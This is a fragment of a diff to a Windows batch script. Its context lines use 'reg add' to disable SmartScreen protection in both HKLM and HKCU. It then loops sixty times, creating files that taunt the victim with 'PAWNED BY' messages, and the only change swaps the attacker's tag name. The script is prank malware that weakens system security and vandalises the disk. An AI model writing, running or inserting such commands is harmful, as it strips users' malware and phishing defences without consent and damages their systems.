@@ -33,7 +33,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScree
 reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v "SmartScreenEnabled" /t "REG_SZ" /d "Off" /f
 set loop1=0
 :loop1
-echo PAWNED BY ARAKELIAN :) > ARAKED[%random%].txt
+echo PAWNED BY GTAPIGOTLOXP :) > ARAKED[%random%].txt
 set /a loop1=%loop1%+1 
 if "%loop1%"=="60" goto 2
 goto loop1
